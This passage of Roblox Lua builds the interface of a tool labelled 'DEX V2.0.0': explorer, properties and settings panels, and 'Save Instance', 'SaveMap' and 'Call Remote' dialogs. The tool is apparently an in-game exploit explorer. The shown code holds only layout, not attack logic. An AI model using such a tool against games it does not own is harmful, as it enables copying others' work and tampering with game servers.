NewGuiPart159.Parent = NewGuiPart2
NewGuiPart159.Archivable = true

NewGuiPart160.Name = "SetAwaiting"
NewGuiPart160.Parent = NewGuiPart2
NewGuiPart160.Archivable = true

NewGuiPart3.Name = "Header"
NewGuiPart3.Parent = NewGuiPart2
NewGuiPart3.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart3.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart3.Position = UDim2.new(0, 0, 0, -36)
NewGuiPart3.Size = UDim2.new(1, 0, 0, 35)

NewGuiPart4.Parent = NewGuiPart3
NewGuiPart4.BackgroundTransparency = 1
NewGuiPart4.Position = UDim2.new(0, 4, 0, 0)
NewGuiPart4.Size = UDim2.new(1, -4, 0.5, 0)
NewGuiPart4.Font = Enum.Font.SourceSans
NewGuiPart4.FontSize = Enum.FontSize.Size14
NewGuiPart4.Text = "Properties"
NewGuiPart4.TextColor3 = Color3.new(0, 0, 0)
NewGuiPart4.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart5.Parent = NewGuiPart3
NewGuiPart5.BackgroundTransparency = 0.80000001192093
NewGuiPart5.Position = UDim2.new(0, 4, 0.5, 0)
NewGuiPart5.Size = UDim2.new(1, -8, 0.5, -3)
NewGuiPart5.Font = Enum.Font.SourceSans
NewGuiPart5.FontSize = Enum.FontSize.Size14
NewGuiPart5.Text = "Search Properties"
--NewGuiPart5.TextColor3 = Color3.new(0, 0, 0)
NewGuiPart5.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart6.Name = "ExplorerPanel"
NewGuiPart6.Parent = NewGuiPart1
NewGuiPart6.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart6.BackgroundTransparency = 0.10000000149012
NewGuiPart6.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
NewGuiPart6.Position = UDim2.new(1, 0, 0, 0)
NewGuiPart6.Size = UDim2.new(0, 300, 0.5, 0)

NewGuiPart153.Name = "GetOption"
NewGuiPart153.Parent = NewGuiPart6
NewGuiPart153.Archivable = true

NewGuiPart154.Name = "GetSelection"
NewGuiPart154.Parent = NewGuiPart6
NewGuiPart154.Archivable = true

NewGuiPart155.Name = "SetOption"
NewGuiPart155.Parent = NewGuiPart6
NewGuiPart155.Archivable = true

NewGuiPart156.Name = "SetSelection"
NewGuiPart156.Parent = NewGuiPart6
NewGuiPart156.Archivable = true

NewGuiPart157.Name = "SelectionChanged"
NewGuiPart157.Parent = NewGuiPart6
NewGuiPart157.Archivable = true

NewGuiPart7.Name = "SideMenu"
NewGuiPart7.Parent = NewGuiPart1
NewGuiPart7.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart7.BackgroundTransparency = 1
NewGuiPart7.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart7.BorderSizePixel = 0
NewGuiPart7.Position = UDim2.new(1, -330, 0, 0)
NewGuiPart7.Size = UDim2.new(0, 30, 0, 180)
NewGuiPart7.Visible = false
NewGuiPart7.ZIndex = 2

NewGuiPart8.Name = "Toggle"
NewGuiPart8.Parent = NewGuiPart7
NewGuiPart8.Active = false
NewGuiPart8.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart8.BorderSizePixel = 0
NewGuiPart8.Position = UDim2.new(0, 0, 0, 60)
NewGuiPart8.Size = UDim2.new(0, 30, 0, 30)
NewGuiPart8.AutoButtonColor = false
NewGuiPart8.Font = Enum.Font.SourceSans
NewGuiPart8.FontSize = Enum.FontSize.Size24
NewGuiPart8.Text = ">"
NewGuiPart8.TextTransparency = 1
NewGuiPart8.TextWrapped = true

NewGuiPart9.Name = "Title"
NewGuiPart9.Parent = NewGuiPart7
NewGuiPart9.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart9.BackgroundTransparency = 1
NewGuiPart9.Size = UDim2.new(0, 30, 0, 20)
NewGuiPart9.ZIndex = 2
NewGuiPart9.Font = Enum.Font.SourceSansBold
NewGuiPart9.FontSize = Enum.FontSize.Size14
NewGuiPart9.Text = "DEX"
NewGuiPart9.TextWrapped = true

NewGuiPart10.Name = "Version"
NewGuiPart10.Parent = NewGuiPart7
NewGuiPart10.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart10.BackgroundTransparency = 1
NewGuiPart10.Position = UDim2.new(0, 0, 0, 15)
NewGuiPart10.Size = UDim2.new(0, 30, 0, 20)
NewGuiPart10.ZIndex = 2
NewGuiPart10.Font = Enum.Font.SourceSansBold
NewGuiPart10.FontSize = Enum.FontSize.Size12
NewGuiPart10.Text = "V2.0.0"
NewGuiPart10.TextWrapped = true

NewGuiPart11.Name = "Slant"
NewGuiPart11.Parent = NewGuiPart7
NewGuiPart11.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart11.BackgroundTransparency = 1
NewGuiPart11.Position = UDim2.new(0, 0, 0, 90)
NewGuiPart11.Rotation = 180
NewGuiPart11.Size = UDim2.new(0, 30, 0, 30)
NewGuiPart11.Image = "rbxassetid://474172996"
NewGuiPart11.ImageColor3 = Color3.new(0.913726, 0.913726, 0.913726)

NewGuiPart12.Name = "Main"
NewGuiPart12.Parent = NewGuiPart7
NewGuiPart12.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart12.BorderSizePixel = 0
NewGuiPart12.Size = UDim2.new(0, 30, 0, 30)

NewGuiPart13.Name = "SlideOut"
NewGuiPart13.Parent = NewGuiPart7
NewGuiPart13.BackgroundColor3 = Color3.new(0.862745, 0.862745, 0.862745)
NewGuiPart13.BackgroundTransparency = 1
NewGuiPart13.BorderSizePixel = 0
NewGuiPart13.ClipsDescendants = true
NewGuiPart13.Position = UDim2.new(0, 0, 0, 30)
NewGuiPart13.Size = UDim2.new(0, 30, 0, 150)

NewGuiPart14.Name = "SlideFrame"
NewGuiPart14.Parent = NewGuiPart13
NewGuiPart14.BackgroundColor3 = Color3.new(0.862745, 0.862745, 0.862745)
NewGuiPart14.BorderSizePixel = 0
NewGuiPart14.Position = UDim2.new(0, 0, 0, -150)
NewGuiPart14.Size = UDim2.new(0, 30, 0, 150)

NewGuiPart15.Name = "Explorer"
NewGuiPart15.Parent = NewGuiPart14
NewGuiPart15.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart15.BackgroundTransparency = 1
NewGuiPart15.BorderSizePixel = 0
NewGuiPart15.Position = UDim2.new(0, 0, 0, 120)
NewGuiPart15.Size = UDim2.new(0, 30, 0, 30)
NewGuiPart15.ZIndex = 2
NewGuiPart15.AutoButtonColor = false
NewGuiPart15.Font = Enum.Font.SourceSans
NewGuiPart15.FontSize = Enum.FontSize.Size24
NewGuiPart15.Text = ""

NewGuiPart16.Name = "Icon"
NewGuiPart16.Parent = NewGuiPart15
NewGuiPart16.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart16.BackgroundTransparency = 1
NewGuiPart16.Position = UDim2.new(0, 5, 0, 5)
NewGuiPart16.Size = UDim2.new(0, 20, 0, 20)
NewGuiPart16.ZIndex = 2
NewGuiPart16.Image = "rbxassetid://472635937"
NewGuiPart16.ImageColor3 = Color3.new(0.27451, 0.27451, 0.27451)

NewGuiPart17.Name = "SaveMap"
NewGuiPart17.Parent = NewGuiPart14
NewGuiPart17.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart17.BackgroundTransparency = 1
NewGuiPart17.BorderSizePixel = 0
NewGuiPart17.Position = UDim2.new(0, 0, 0, 90)
NewGuiPart17.Size = UDim2.new(0, 30, 0, 30)
NewGuiPart17.ZIndex = 2
NewGuiPart17.AutoButtonColor = false
NewGuiPart17.Font = Enum.Font.SourceSans
NewGuiPart17.FontSize = Enum.FontSize.Size24
NewGuiPart17.Text = ""

NewGuiPart18.Name = "Icon"
NewGuiPart18.Parent = NewGuiPart17
NewGuiPart18.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart18.BackgroundTransparency = 1
NewGuiPart18.Position = UDim2.new(0, 5, 0, 5)
NewGuiPart18.Size = UDim2.new(0, 20, 0, 20)
NewGuiPart18.ZIndex = 2
NewGuiPart18.Image = "rbxassetid://472636337"
NewGuiPart18.ImageColor3 = Color3.new(0.27451, 0.27451, 0.27451)

NewGuiPart19.Name = "Settings"
NewGuiPart19.Parent = NewGuiPart14
NewGuiPart19.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart19.BackgroundTransparency = 1
NewGuiPart19.BorderSizePixel = 0
NewGuiPart19.Position = UDim2.new(0, 0, 0, 30)
NewGuiPart19.Size = UDim2.new(0, 30, 0, 30)
NewGuiPart19.ZIndex = 2
NewGuiPart19.AutoButtonColor = false
NewGuiPart19.Font = Enum.Font.SourceSans
NewGuiPart19.FontSize = Enum.FontSize.Size24
NewGuiPart19.Text = ""

NewGuiPart20.Name = "Icon"
NewGuiPart20.Parent = NewGuiPart19
NewGuiPart20.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart20.BackgroundTransparency = 1
NewGuiPart20.Position = UDim2.new(0, 5, 0, 5)
NewGuiPart20.Size = UDim2.new(0, 20, 0, 20)
NewGuiPart20.ZIndex = 2
NewGuiPart20.Image = "rbxassetid://472635774"
NewGuiPart20.ImageColor3 = Color3.new(0.27451, 0.27451, 0.27451)

NewGuiPart21.Name = "Remotes"
NewGuiPart21.Parent = NewGuiPart14
NewGuiPart21.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart21.BackgroundTransparency = 1
NewGuiPart21.BorderSizePixel = 0
NewGuiPart21.Position = UDim2.new(0, 0, 0, 60)
NewGuiPart21.Size = UDim2.new(0, 30, 0, 30)
NewGuiPart21.ZIndex = 2
NewGuiPart21.AutoButtonColor = false
NewGuiPart21.Font = Enum.Font.SourceSans
NewGuiPart21.FontSize = Enum.FontSize.Size24
NewGuiPart21.Text = ""

NewGuiPart22.Name = "Icon"
NewGuiPart22.Parent = NewGuiPart21
NewGuiPart22.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart22.BackgroundTransparency = 1
NewGuiPart22.Position = UDim2.new(0, 5, 0, 5)
NewGuiPart22.Size = UDim2.new(0, 20, 0, 20)
NewGuiPart22.ZIndex = 2
NewGuiPart22.Image = "rbxassetid://472636187"
NewGuiPart22.ImageColor3 = Color3.new(0.27451, 0.27451, 0.27451)

NewGuiPart23.Name = "About"
NewGuiPart23.Parent = NewGuiPart14
NewGuiPart23.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart23.BackgroundTransparency = 1
NewGuiPart23.BorderSizePixel = 0
NewGuiPart23.Size = UDim2.new(0, 30, 0, 30)
NewGuiPart23.ZIndex = 2
NewGuiPart23.AutoButtonColor = false
NewGuiPart23.Font = Enum.Font.SourceSans
NewGuiPart23.FontSize = Enum.FontSize.Size24
NewGuiPart23.Text = ""

NewGuiPart24.Name = "Icon"
NewGuiPart24.Parent = NewGuiPart23
NewGuiPart24.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart24.BackgroundTransparency = 1
NewGuiPart24.Position = UDim2.new(0, 5, 0, 5)
NewGuiPart24.Size = UDim2.new(0, 20, 0, 20)
NewGuiPart24.ZIndex = 2
NewGuiPart24.Image = "rbxassetid://476354004"
NewGuiPart24.ImageColor3 = Color3.new(0.27451, 0.27451, 0.27451)

NewGuiPart25.Name = "OpenScriptEditor"
NewGuiPart25.Parent = NewGuiPart7
NewGuiPart25.Active = false
NewGuiPart25.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart25.BorderSizePixel = 0
NewGuiPart25.Position = UDim2.new(0, 0, 0, 30)
NewGuiPart25.Size = UDim2.new(0, 30, 0, 30)
NewGuiPart25.ZIndex = 2
NewGuiPart25.AutoButtonColor = false
NewGuiPart25.Font = Enum.Font.SourceSans
NewGuiPart25.FontSize = Enum.FontSize.Size24
NewGuiPart25.Text = ""

NewGuiPart26.Name = "Icon"
NewGuiPart26.Parent = NewGuiPart25
NewGuiPart26.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart26.BackgroundTransparency = 1
NewGuiPart26.Position = UDim2.new(0, 5, 0, 5)
NewGuiPart26.Size = UDim2.new(0, 20, 0, 20)
NewGuiPart26.ZIndex = 2
NewGuiPart26.Image = "rbxassetid://475456048"
NewGuiPart26.ImageColor3 = Color3.new(0.105882, 0.164706, 0.207843)
NewGuiPart26.ImageTransparency = 1

NewGuiPart27.Name = "Toggle"
NewGuiPart27.Parent = NewGuiPart1
NewGuiPart27.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart27.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart27.Position = UDim2.new(1, 0, 0, 0)
NewGuiPart27.Size = UDim2.new(0, 30, 0, 30)
NewGuiPart27.Font = Enum.Font.SourceSans
NewGuiPart27.FontSize = Enum.FontSize.Size24
NewGuiPart27.Text = "<"

NewGuiPart28.Name = "SettingsPanel"
NewGuiPart28.Parent = NewGuiPart1
NewGuiPart28.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart28.BackgroundTransparency = 0.10000000149012
NewGuiPart28.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
NewGuiPart28.Position = UDim2.new(1, 0, 0, 0)
NewGuiPart28.Size = UDim2.new(0, 300, 1, 0)

NewGuiPart162.Name = "GetSetting"
NewGuiPart162.Parent = NewGuiPart28
NewGuiPart162.Archivable = true

NewGuiPart29.Name = "Header"
NewGuiPart29.Parent = NewGuiPart28
NewGuiPart29.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart29.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart29.Size = UDim2.new(1, 0, 0, 17)

NewGuiPart30.Parent = NewGuiPart29
NewGuiPart30.BackgroundTransparency = 1
NewGuiPart30.Position = UDim2.new(0, 4, 0, 0)
NewGuiPart30.Size = UDim2.new(1, -4, 1, 0)
NewGuiPart30.Font = Enum.Font.SourceSans
NewGuiPart30.FontSize = Enum.FontSize.Size14
NewGuiPart30.Text = "Settings"
NewGuiPart30.TextColor3 = Color3.new(0, 0, 0)
NewGuiPart30.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart31.Name = "SettingTemplate"
NewGuiPart31.Parent = NewGuiPart28
NewGuiPart31.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart31.BackgroundTransparency = 1
NewGuiPart31.Position = UDim2.new(0, 0, 0, 18)
NewGuiPart31.Size = UDim2.new(1, 0, 0, 60)
NewGuiPart31.Visible = false

NewGuiPart32.Name = "SName"
NewGuiPart32.Parent = NewGuiPart31
NewGuiPart32.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart32.BackgroundTransparency = 1
NewGuiPart32.Position = UDim2.new(0, 10, 0, 0)
NewGuiPart32.Size = UDim2.new(1, -20, 0, 30)
NewGuiPart32.Font = Enum.Font.SourceSans
NewGuiPart32.FontSize = Enum.FontSize.Size18
NewGuiPart32.Text = "SettingName"
NewGuiPart32.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart33.Name = "Status"
NewGuiPart33.Parent = NewGuiPart31
NewGuiPart33.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart33.BackgroundTransparency = 1
NewGuiPart33.Position = UDim2.new(0, 60, 0, 30)
NewGuiPart33.Size = UDim2.new(0, 50, 0, 15)
NewGuiPart33.Font = Enum.Font.SourceSans
NewGuiPart33.FontSize = Enum.FontSize.Size18
NewGuiPart33.Text = "Off"
NewGuiPart33.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart34.Name = "Change"
NewGuiPart34.Parent = NewGuiPart31
NewGuiPart34.BackgroundColor3 = Color3.new(0.862745, 0.862745, 0.862745)
NewGuiPart34.BorderSizePixel = 0
NewGuiPart34.Position = UDim2.new(0, 10, 0, 30)
NewGuiPart34.Size = UDim2.new(0, 40, 0, 15)
NewGuiPart34.Font = Enum.Font.SourceSans
NewGuiPart34.FontSize = Enum.FontSize.Size14
NewGuiPart34.Text = ""

NewGuiPart35.Name = "OnBar"
NewGuiPart35.Parent = NewGuiPart34
NewGuiPart35.BackgroundColor3 = Color3.new(0, 0.576471, 0.862745)
NewGuiPart35.BorderSizePixel = 0
NewGuiPart35.Size = UDim2.new(0, 0, 0, 15)
NewGuiPart35.Font = Enum.Font.SourceSans
NewGuiPart35.FontSize = Enum.FontSize.Size14
NewGuiPart35.Text = ""

NewGuiPart36.Name = "Bar"
NewGuiPart36.Parent = NewGuiPart34
NewGuiPart36.BackgroundColor3 = Color3.new(0, 0, 0)
NewGuiPart36.BorderSizePixel = 0
NewGuiPart36.ClipsDescendants = true
NewGuiPart36.Position = UDim2.new(0, -2, 0, -2)
NewGuiPart36.Size = UDim2.new(0, 10, 0, 19)
NewGuiPart36.Font = Enum.Font.SourceSans
NewGuiPart36.FontSize = Enum.FontSize.Size14
NewGuiPart36.Text = ""

NewGuiPart37.Name = "SettingList"
NewGuiPart37.Parent = NewGuiPart28
NewGuiPart37.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart37.BackgroundTransparency = 1
NewGuiPart37.Position = UDim2.new(0, 0, 0, 17)
NewGuiPart37.Size = UDim2.new(1, 0, 1, -17)

NewGuiPart38.Name = "SaveInstance"
NewGuiPart38.Parent = NewGuiPart1
NewGuiPart38.Active = true
NewGuiPart38.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart38.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart38.Draggable = true
NewGuiPart38.Position = UDim2.new(0.300000012, 0, 0.300000012, 0)
NewGuiPart38.Size = UDim2.new(0, 350, 0, 20)
NewGuiPart38.Visible = false
NewGuiPart38.ZIndex = 2

NewGuiPart39.Name = "Title"
NewGuiPart39.Parent = NewGuiPart38
NewGuiPart39.BackgroundTransparency = 1
NewGuiPart39.Size = UDim2.new(1, 0, 1, 0)
NewGuiPart39.ZIndex = 2
NewGuiPart39.Font = Enum.Font.SourceSans
NewGuiPart39.FontSize = Enum.FontSize.Size14
NewGuiPart39.Text = "Save Instance"
NewGuiPart39.TextColor3 = Color3.new(0, 0, 0)
NewGuiPart39.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart40.Name = "MainWindow"
NewGuiPart40.Parent = NewGuiPart38
NewGuiPart40.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart40.BackgroundTransparency = 0.10000000149012
NewGuiPart40.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
NewGuiPart40.Size = UDim2.new(1, 0, 0, 200)

NewGuiPart41.Name = "Save"
NewGuiPart41.Parent = NewGuiPart40
NewGuiPart41.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart41.BackgroundTransparency = 0.5
NewGuiPart41.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart41.Position = UDim2.new(0.075000003, 0, 1, -40)
NewGuiPart41.Size = UDim2.new(0.400000006, 0, 0, 30)
NewGuiPart41.Font = Enum.Font.SourceSans
NewGuiPart41.FontSize = Enum.FontSize.Size18
NewGuiPart41.Text = "Save"

NewGuiPart42.Name = "Desc"
NewGuiPart42.Parent = NewGuiPart40
NewGuiPart42.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart42.BackgroundTransparency = 1
NewGuiPart42.Position = UDim2.new(0, 0, 0, 20)
NewGuiPart42.Size = UDim2.new(1, 0, 0, 40)
NewGuiPart42.Font = Enum.Font.SourceSans
NewGuiPart42.FontSize = Enum.FontSize.Size14
NewGuiPart42.Text = "This will save an instance to your PC. Type in the name for your instance. (.rbxmx will be added automatically.)"
NewGuiPart42.TextWrapped = true

NewGuiPart43.Name = "Cancel"
NewGuiPart43.Parent = NewGuiPart40
NewGuiPart43.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart43.BackgroundTransparency = 0.5
NewGuiPart43.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart43.Position = UDim2.new(0.524999976, 0, 1, -40)
NewGuiPart43.Size = UDim2.new(0.400000006, 0, 0, 30)
NewGuiPart43.Font = Enum.Font.SourceSans
NewGuiPart43.FontSize = Enum.FontSize.Size18
NewGuiPart43.Text = "Cancel"

NewGuiPart44.Name = "FileName"
NewGuiPart44.Parent = NewGuiPart40
NewGuiPart44.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart44.BackgroundTransparency = 0.20000000298023
NewGuiPart44.Position = UDim2.new(0.075000003, 0, 0.400000006, 0)
NewGuiPart44.Size = UDim2.new(0.850000024, 0, 0, 30)
NewGuiPart44.Font = Enum.Font.SourceSans
NewGuiPart44.FontSize = Enum.FontSize.Size18
NewGuiPart44.Text = ""
NewGuiPart44.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart45.Name = "SaveObjects"
NewGuiPart45.Parent = NewGuiPart40
NewGuiPart45.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart45.BackgroundTransparency = 0.60000002384186
NewGuiPart45.Position = UDim2.new(0.075000003, 0, 0.625, 0)
NewGuiPart45.Size = UDim2.new(0, 20, 0, 20)
NewGuiPart45.ZIndex = 2
NewGuiPart45.Font = Enum.Font.SourceSans
NewGuiPart45.FontSize = Enum.FontSize.Size18
NewGuiPart45.Text = ""
NewGuiPart45.TextColor3 = Color3.new(1, 1, 1)

NewGuiPart46.Name = "enabled"
NewGuiPart46.Parent = NewGuiPart45
NewGuiPart46.BackgroundColor3 = Color3.new(0.380392, 0.380392, 0.380392)
NewGuiPart46.BackgroundTransparency = 0.40000000596046
NewGuiPart46.BorderSizePixel = 0
NewGuiPart46.Position = UDim2.new(0, 3, 0, 3)
NewGuiPart46.Size = UDim2.new(0, 14, 0, 14)
NewGuiPart46.Font = Enum.Font.SourceSans
NewGuiPart46.FontSize = Enum.FontSize.Size14
NewGuiPart46.Text = ""

NewGuiPart47.Name = "Desc2"
NewGuiPart47.Parent = NewGuiPart40
NewGuiPart47.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart47.BackgroundTransparency = 1
NewGuiPart47.Position = UDim2.new(0.075000003, 30, 0.625, 0)
NewGuiPart47.Size = UDim2.new(0.925000012, -30, 0, 20)
NewGuiPart47.Font = Enum.Font.SourceSans
NewGuiPart47.FontSize = Enum.FontSize.Size14
NewGuiPart47.Text = "Save \"Object\" type values"
NewGuiPart47.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart48.Name = "Confirmation"
NewGuiPart48.Parent = NewGuiPart1
NewGuiPart48.Active = true
NewGuiPart48.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart48.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart48.Draggable = true
NewGuiPart48.Position = UDim2.new(0.300000012, 0, 0.349999994, 0)
NewGuiPart48.Size = UDim2.new(0, 350, 0, 20)
NewGuiPart48.Visible = false
NewGuiPart48.ZIndex = 3

NewGuiPart49.Name = "Title"
NewGuiPart49.Parent = NewGuiPart48
NewGuiPart49.BackgroundTransparency = 1
NewGuiPart49.Size = UDim2.new(1, 0, 1, 0)
NewGuiPart49.ZIndex = 3
NewGuiPart49.Font = Enum.Font.SourceSans
NewGuiPart49.FontSize = Enum.FontSize.Size14
NewGuiPart49.Text = "Confirm"
NewGuiPart49.TextColor3 = Color3.new(0, 0, 0)
NewGuiPart49.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart50.Name = "MainWindow"
NewGuiPart50.Parent = NewGuiPart48
NewGuiPart50.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart50.BackgroundTransparency = 0.10000000149012
NewGuiPart50.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
NewGuiPart50.Size = UDim2.new(1, 0, 0, 150)
NewGuiPart50.ZIndex = 2

NewGuiPart51.Name = "Yes"
NewGuiPart51.Parent = NewGuiPart50
NewGuiPart51.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart51.BackgroundTransparency = 0.5
NewGuiPart51.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart51.Position = UDim2.new(0.075000003, 0, 1, -40)
NewGuiPart51.Size = UDim2.new(0.400000006, 0, 0, 30)
NewGuiPart51.ZIndex = 2
NewGuiPart51.Font = Enum.Font.SourceSans
NewGuiPart51.FontSize = Enum.FontSize.Size18
NewGuiPart51.Text = "Yes"

NewGuiPart52.Name = "Desc"
NewGuiPart52.Parent = NewGuiPart50
NewGuiPart52.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart52.BackgroundTransparency = 1
NewGuiPart52.Position = UDim2.new(0, 0, 0, 20)
NewGuiPart52.Size = UDim2.new(1, 0, 0, 40)
NewGuiPart52.ZIndex = 2
NewGuiPart52.Font = Enum.Font.SourceSans
NewGuiPart52.FontSize = Enum.FontSize.Size14
NewGuiPart52.Text = "The file, FILENAME, already exists. Overwrite?"
NewGuiPart52.TextWrapped = true

NewGuiPart53.Name = "No"
NewGuiPart53.Parent = NewGuiPart50
NewGuiPart53.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart53.BackgroundTransparency = 0.5
NewGuiPart53.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart53.Position = UDim2.new(0.524999976, 0, 1, -40)
NewGuiPart53.Size = UDim2.new(0.400000006, 0, 0, 30)
NewGuiPart53.ZIndex = 2
NewGuiPart53.Font = Enum.Font.SourceSans
NewGuiPart53.FontSize = Enum.FontSize.Size18
NewGuiPart53.Text = "No"

NewGuiPart54.Name = "Caution"
NewGuiPart54.Parent = NewGuiPart1
NewGuiPart54.Active = true
NewGuiPart54.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart54.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart54.Draggable = true
NewGuiPart54.Position = UDim2.new(0.300000012, 0, 0.300000012, 0)
NewGuiPart54.Size = UDim2.new(0, 350, 0, 20)
NewGuiPart54.Visible = false
NewGuiPart54.ZIndex = 5

NewGuiPart55.Name = "Title"
NewGuiPart55.Parent = NewGuiPart54
NewGuiPart55.BackgroundTransparency = 1
NewGuiPart55.Size = UDim2.new(1, 0, 1, 0)
NewGuiPart55.ZIndex = 5
NewGuiPart55.Font = Enum.Font.SourceSans
NewGuiPart55.FontSize = Enum.FontSize.Size14
NewGuiPart55.Text = "Caution"
NewGuiPart55.TextColor3 = Color3.new(0, 0, 0)
NewGuiPart55.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart56.Name = "MainWindow"
NewGuiPart56.Parent = NewGuiPart54
NewGuiPart56.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart56.BackgroundTransparency = 0.10000000149012
NewGuiPart56.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
NewGuiPart56.Size = UDim2.new(1, 0, 0, 150)
NewGuiPart56.ZIndex = 4

NewGuiPart57.Name = "Desc"
NewGuiPart57.Parent = NewGuiPart56
NewGuiPart57.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart57.BackgroundTransparency = 1
NewGuiPart57.Position = UDim2.new(0, 0, 0, 20)
NewGuiPart57.Size = UDim2.new(1, 0, 0, 42)
NewGuiPart57.ZIndex = 4
NewGuiPart57.Font = Enum.Font.SourceSans
NewGuiPart57.FontSize = Enum.FontSize.Size14
NewGuiPart57.Text = "The file, FILENAME, already exists. Overwrite?"
NewGuiPart57.TextWrapped = true

NewGuiPart58.Name = "Ok"
NewGuiPart58.Parent = NewGuiPart56
NewGuiPart58.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart58.BackgroundTransparency = 0.5
NewGuiPart58.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart58.Position = UDim2.new(0.300000012, 0, 1, -40)
NewGuiPart58.Size = UDim2.new(0.400000006, 0, 0, 30)
NewGuiPart58.ZIndex = 4
NewGuiPart58.Font = Enum.Font.SourceSans
NewGuiPart58.FontSize = Enum.FontSize.Size18
NewGuiPart58.Text = "Ok"

NewGuiPart59.Name = "CallRemote"
NewGuiPart59.Parent = NewGuiPart1
NewGuiPart59.Active = true
NewGuiPart59.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart59.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart59.Draggable = true
NewGuiPart59.Position = UDim2.new(0.300000012, 0, 0.300000012, 0)
NewGuiPart59.Size = UDim2.new(0, 350, 0, 20)
NewGuiPart59.Visible = false
NewGuiPart59.ZIndex = 2

NewGuiPart60.Name = "Title"
NewGuiPart60.Parent = NewGuiPart59
NewGuiPart60.BackgroundTransparency = 1
NewGuiPart60.Size = UDim2.new(1, 0, 1, 0)
NewGuiPart60.ZIndex = 2
NewGuiPart60.Font = Enum.Font.SourceSans
NewGuiPart60.FontSize = Enum.FontSize.Size14
NewGuiPart60.Text = "Call Remote"
NewGuiPart60.TextColor3 = Color3.new(0, 0, 0)
NewGuiPart60.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart61.Name = "MainWindow"
NewGuiPart61.Parent = NewGuiPart59
NewGuiPart61.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart61.BackgroundTransparency = 0.10000000149012
NewGuiPart61.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
NewGuiPart61.Size = UDim2.new(1, 0, 0, 200)

NewGuiPart62.Name = "Desc"
NewGuiPart62.Parent = NewGuiPart61
NewGuiPart62.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart62.BackgroundTransparency = 1
NewGuiPart62.Position = UDim2.new(0, 0, 0, 20)
NewGuiPart62.Size = UDim2.new(1, 0, 0, 20)
NewGuiPart62.Font = Enum.Font.SourceSans
